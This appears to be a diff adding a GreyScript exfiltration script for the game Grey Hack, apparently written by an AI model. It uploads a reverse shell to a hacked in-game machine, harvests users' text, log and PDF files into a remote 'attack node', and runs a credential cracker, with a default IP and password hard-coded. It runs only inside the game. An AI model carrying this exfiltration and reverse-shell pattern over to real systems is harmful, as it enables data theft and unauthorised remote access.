@@ -1,0 +1,378 @@
+// steal.src - Advanced data exfiltration script for Grey Hack
+// Usage: Run this script on the compromised target machine
+// Author: AI Assistant for Grey Hack operations
+
+// ===== CONFIGURATION SECTION =====
+print "=== Grey Hack Data Exfiltration Script ==="
+print "Enter configuration (press Enter for defaults):"
+
+// Get attack node IP
+attack_ip = user_input("Attack node IP [84.186.118.73]: ").trim
+if attack_ip == "" then attack_ip = "84.186.118.73"
+
+// Get attack node credentials
+attack_user = user_input("Attack node username [darkeye]: ").trim
+if attack_user == "" then attack_user = "darkeye"
+
+attack_pass = user_input("Attack node password [l]: ").trim
+if attack_pass == "" then attack_pass = "l"
+
+print "Configuration set. Starting exfiltration..."
+print "Attack node: " + attack_ip
+print "Username: " + attack_user
+
+// ===== UTILITY FUNCTIONS =====
+
+// Check if process is running
+check_process_running = function(process_name)
+	computer = get_shell.host_computer
+	result = computer.show_procs
+	print "listed processes" + " " + result
+	if result and result.indexOf(process_name) != null then
+		return 1
+	end if
+	return 0
+end function
+
+// Safe file creation with debugging
+safe_touch = function(comp, dir_path, filename)
+	print "    Attempting to create: " + dir_path + "/" + filename
+	// Check if directory exists first
+	dir_file = comp.File(dir_path)
+	if not dir_file or not dir_file.is_folder then
+		print "    Error: Directory does not exist: " + dir_path
+		return null
+	end if
+
+	result = comp.touch(dir_path, filename)
+	if result then
+		print "    Touch successful, getting file object"
+		return comp.File(dir_path + "/" + filename)
+	else
+		print "    Touch failed for: " + filename
+	end if
+	return null
+end function
+
+// Safe directory creation with debugging
+safe_create_folder = function(comp, parent_path, folder_name)
+	print "  Creating folder: " + parent_path + "/" + folder_name
+	// Check if parent exists
+	parent_file = comp.File(parent_path)
+	if not parent_file or not parent_file.is_folder then
+		print "  Error: Parent directory does not exist: " + parent_path
+		return 0
+	end if
+
+	result = comp.create_folder(parent_path, folder_name)
+	if result then
+		print "  Folder created successfully"
+		return 1
+	else
+		// Check if it already exists
+		existing = comp.File(parent_path + "/" + folder_name)
+		if existing and existing.is_folder then
+			print "  Folder already exists"
+			return 1
+		else
+			print "  Failed to create folder"
+			return 0
+		end if
+	end if
+end function
+
+// Get public IP of current machine
+get_public_ip = function
+	shell = get_shell
+	router = get_router
+	if router then
+		return router.public_ip
+	end if
+	return "unknown"
+end function
+
+// Get LAN IP of current machine
+get_lan_ip = function
+	shell = get_shell
+	comp = shell.host_computer
+	if comp then
+		return comp.local_ip
+	end if
+	return "unknown"
+end function
+
+// Recursive file finder - searches all subdirectories
+find_files_recursive = function(folder, target_extensions)
+	all_files = []
+
+	if not folder or not folder.is_folder then
+		return all_files
+	end if
+
+	// Get files in current directory
+	files = folder.get_files
+	for file in files
+		if not file.is_folder then
+			// Check if file has target extension
+			file_name = file.name
+			for ext in target_extensions
+				if file_name.len >= ext.len and file_name[-ext.len : ] == ext then
+					all_files.push file
+					break
+				end if
+			end for
+		end if
+	end for
+
+	// Recursively search subdirectories
+	subfolders = folder.get_folders
+	for subfolder in subfolders
+		subfolder_files = find_files_recursive(subfolder, target_extensions)
+		for subfile in subfolder_files
+			all_files.push subfile
+		end for
+	end for
+
+	return all_files
+end function
+
+// ===== MAIN EXECUTION =====
+
+// Step 1: Upload required tools from attack node
+print "[1/8] Uploading required tools from attack node..."
+
+// Connect to attack node to upload tools
+upload_shell = get_shell.connect_service(
+	attack_ip,
+	22,
+	attack_user,
+	attack_pass)
+if not upload_shell then
+	print "Error: Cannot connect to attack node to upload tools. Exiting."
+	exit
+end if
+
+// Get local shell for SCP target
+local_shell = get_shell
+
+// Upload reverse shell program using SCP
+print "  Uploading reverse shell program..."
+rshell_result = upload_shell.scp("/home/" + attack_user + "/reverse_shell", "/root/Downloads", local_shell)
+if rshell_result then
+	print "    Reverse shell uploaded successfully"
+	// Make it executable
+	get_shell.launch("/bin/chmod", "+x /root/Downloads/reverse_shell")
+else
+	print "    ERROR: Failed to upload reverse shell"
+end if
+
+// Upload metaxploit.so library using SCP
+print "  Uploading metaxploit library..."
+metax_result = upload_shell.scp("/lib/metaxploit.so", "/root/Downloads", local_shell)
+if metax_result then
+	print "    Metaxploit library uploaded successfully"
+else
+	print "    ERROR: Failed to upload metaxploit.so"
+end if
+
+print "Tool upload completed"
+
+// Step 2: Check for existing reverse shell
+print "[2/8] Checking for existing reverse shell..."
+if check_process_running("rshell_client") then
+	print "Reverse shell already running, skipping creation"
+else
+	print "Creating reverse shell to " + attack_ip
+	shell = get_shell
+	// Use uploaded reverse shell
+	rshell_result = shell.launch("/root/Downloads/reverse_shell", attack_ip)
+	if rshell_result then
+		print "Reverse shell created successfully"
+		wait 2
+	else
+		print "Warning: Failed to create reverse shell, continuing anyway"
+	end if
+end if
+
+// Step 3: Get target machine info
+print "[3/8] Getting target machine information..."
+target_public_ip = get_public_ip
+target_lan_ip = get_lan_ip
+print "Target public IP: " + target_public_ip
+print "Target LAN IP: " + target_lan_ip
+
+// Step 4: Connect to attack node and setup folders
+print "[4/8] Connecting to attack node to setup folder structure..."
+shell = get_shell
+attack_shell = shell.connect_service(
+	attack_ip,
+	22,
+	attack_user,
+	attack_pass)
+
+if not attack_shell then
+	print "Error: Cannot connect to attack node. Exiting."
+	exit
+end if
+
+
+attack_comp = attack_shell.host_computer
+if not attack_comp then
+	print "Error: Cannot access attack node computer. Exiting."
+	exit
+end if
+
+// Create base folder structure
+base_path = "/home/" + attack_user + "/hacked"
+target_path = base_path + "/" + target_public_ip + "/" + target_lan_ip
+
+print "Creating folder structure: " + target_path
+
+// Ensure base directories exist
+safe_create_folder attack_comp, "/home/" + attack_user, "hacked"
+safe_create_folder attack_comp, base_path, target_public_ip
+safe_create_folder attack_comp, base_path + "/" + target_public_ip, target_lan_ip
+
+print "Folder structure created"
+
+// Step 5: Scan for users and files
+print "[5/8] Scanning for user directories and files..."
+local_comp = get_shell.host_computer
+home_dir = local_comp.File("/home")
+
+if not home_dir or not home_dir.is_folder then
+	print "Error: Cannot access /home directory"
+	exit
+end if
+
+user_folders = home_dir.get_folders
+file_extensions = [
+	".log",
+	".pdf",
+	".txt",
+]
+downloaded_files = []
+
+print "Found " + user_folders.len + " user directories"
+
+// Step 6: Download files from each user
+print "[6/8] Downloading files from user directories..."
+
+for user_folder in user_folders
+	user_name = user_folder.name
+	print "Processing user: " + user_name
+
+	// Connect to attack node for this user
+	user_shell = get_shell.connect_service(
+		attack_ip,
+		22,
+		attack_user,
+		attack_pass)
+	if not user_shell then
+		print "Warning: Cannot connect to attack node for user " + user_name
+		continue
+	end if
+
+	user_comp = user_shell.host_computer
+	user_target_path = target_path + "/" + user_name
+
+	// Create user folder on attack node
+	safe_create_folder user_comp, target_path, user_name
+
+	// Recursively find all target files in user's home directory
+	print "  Searching recursively for target files in " + user_name + " directory..."
+	target_files = find_files_recursive(user_folder, file_extensions)
+	print "  Found " + target_files.len + " target files total (recursive search)"
+
+	for file in target_files
+		file_name = file.name
+		file_path = file.path
+
+		// Calculate relative path from user home for folder structure
+		user_home_path = user_folder.path
+		if file_path.indexOf(user_home_path) == 0 then
+			relative_path = file_path[user_home_path.len + 1 : ]
+		else
+			relative_path = file_name
+		end if
+
+		print "  Found target file: " + relative_path
+
+		// Read file content from target
+		print "    Reading file content..."
+		file_content = file.get_content
+		if file_content then
+			print "    Content read: " + file_content.len + " characters"
+
+			// Create subdirectory structure on attack node if needed
+			target_file_path = user_target_path + "/" + relative_path
+
+			if relative_path.indexOf("/") != null then
+				// File is in subdirectory, get directory part
+				path_parts = relative_path.split("/")
+				file_name_only = path_parts[-1]
+
+				// Build directory path step by step
+				current_path = user_target_path
+				i = 0
+				while i < path_parts.len - 1
+					folder_name = path_parts[i]
+					safe_create_folder user_comp, current_path, folder_name
+					current_path = current_path + "/" + folder_name
+					i = i + 1
+				end while
+
+				// Create file in final directory
+				attack_file = safe_touch(user_comp, current_path, file_name_only)
+			else
+				// File is directly in user home
+				attack_file = safe_touch(user_comp, user_target_path, file_name)
+			end if
+
+			if attack_file then
+				print "    Setting file content..."
+				attack_file.set_content file_content
+				downloaded_files.push target_file_path
+				print "    Downloaded successfully: " + relative_path
+			else
+				print "    ERROR: Failed to create file on attack node: " + relative_path
+			end if
+		else
+			print "    ERROR: Failed to read file content from: " + relative_path
+		end if
+	end for
+
+end for
+
+print "Downloaded " + downloaded_files.len + " files total"
+
+// Step 7: Launch crack command on attack node to process credentials
+print "[7/8] Launching crack command on attack node to process credentials..."
+
+// Connect to attack node to run crack command
+crack_shell = get_shell.connect_service(
+	attack_ip,
+	22,
+	attack_user,
+	attack_pass)
+if not crack_shell then
+	print "Error: Cannot connect to attack node to run crack command"
+	exit
+end if
+
+// Run crack command to process Mail.txt and Bank.txt files for this target only
+print "  Running crack command to decipher credentials..."
+crack_result = crack_shell.launch("/usr/bin/crack", target_path)
+if crack_result then
+	print "  Crack command completed successfully"
+	print "  Output: " + crack_result
+else
+	print "  Warning: Crack command failed or produced no output"
+end if
+
+// Step 8: Cleanup and exit
+print "[8/8] Exfiltration completed successfully!"
+print "Files downloaded: " + downloaded_files.len
+print "Target folder: " + target_path
+print "Credentials processed and saved to Desktop"
+print "Script execution finished."
